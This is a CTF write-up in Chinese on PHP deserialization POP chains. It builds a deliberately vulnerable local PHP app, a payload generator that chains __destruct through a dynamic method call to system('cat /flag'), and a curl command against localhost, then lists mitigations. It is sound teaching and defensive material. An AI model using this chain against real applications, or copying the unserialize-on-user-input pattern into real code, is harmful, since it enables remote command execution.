---
title: "PHP 反序列化 POP 链（二）"
slug: "ctf-php-pop-chain-2"
date: 2026-08-29T18:10:29+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从题目源码出发，手工构造 PHP POP 链并验证危险方法调用。"
summary: "从题目源码出发，手工构造 PHP POP 链并验证危险方法调用。"
tags: ["CTF", "PHP", "反序列化"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 4
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/4.php反序列化漏洞(pop链利用2).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-php-pop-chain-2/workflow.svg" alt="从反序列化入口出发，经析构、唤醒和魔术调用最终进入危险函数。" loading="lazy">
  <figcaption>图 1 · PHP POP 链对象跳转。从反序列化入口出发，经析构、唤醒和魔术调用最终进入危险函数。</figcaption>
</figure>

## 1. 说明：原题转写需要校正

原笔记里的 `pubilc`、`__Check`、`$this->Age`、`PersonC` 缺失等写法无法直接运行。
下面给出一个**保留原意、可实际运行**的最小 POP 链，用来复现：

```text
unserialize → __destruct → 动态方法调用 → system
```

原题类名和属性名必须根据真实源码替换。

## 2. 本地漏洞环境

创建 `/tmp/php-pop/index.php`：

```php
<?php
class PersonA {
    public mixed $name;
    public string $id;
    public mixed $age;

    public function __destruct() {
        $target = $this->name;
        $method = $this->id;
        $target->$method($this->age);
    }
}

class PersonB {
    public mixed $name;
    public mixed $age;

    public function __Check($unused = null) {
        $callable = $this->name;
        $callable($this->age);
    }
}

if (isset($_GET['person'])) {
    unserialize($_GET['person']);
}
```

启动：

```bash
cd /tmp/php-pop
php -S 127.0.0.1:8080
```

## 3. 生成 payload

创建 `/tmp/php-pop/build.php`：

```php
<?php
class PersonA {
    public mixed $name;
    public string $id;
    public mixed $age;
}

class PersonB {
    public mixed $name;
    public mixed $age;
}

$b = new PersonB();
$b->name = 'system';
$b->age = 'cat /flag';

$a = new PersonA();
$a->name = $b;
$a->id = '__Check';
$a->age = null;

echo urlencode(serialize($a));
```

生成并发送：

```bash
PAYLOAD="$(php /tmp/php-pop/build.php)"
curl -i -sS --get --data-urlencode "person=$PAYLOAD" \
  'http://127.0.0.1:8080/'
```

预期：

```text
flag{php_pop_demo}
```

## 4. 为什么能链起来

1. `unserialize` 恢复 `PersonA`；
2. 请求结束后触发 `PersonA::__destruct()`；
3. `$a->name` 是 `PersonB`；
4. `$a->id` 是 `__Check`；
5. `PersonB::__Check()` 调用 `system('cat /flag')`。

## 5. 原题适配步骤

- 从源码复制真实类定义；
- 保留 original property names；
- 查找 `__destruct`、`__wakeup`、`__toString`、`__invoke` 等入口；
- 用 PHP 本地生成 serialize；
- 用 URL 编码提交；
- 如果目标没有 `/flag`，先执行 `id` 或 `whoami` 验证。

## 6. 排错

| 现象 | 原因 |
| --- | --- |
| `unserialize` 无反应 | 触发的 magic method 不正确 |
| 属性丢失 | 属性是 `private/protected`，序列化名称不同 |
| 方法不存在 | 原题方法名与本地不同 |
| 命令无回显 | `system` 被禁用或输出被吞 |

## 7. 修复建议

- 不反序列化不可信输入；
- 使用 `allowed_classes` 白名单；
- 禁止对象属性直接承载 callable；
- 对魔术方法中的动态调用做审计；
- 低权限运行并禁用危险函数。
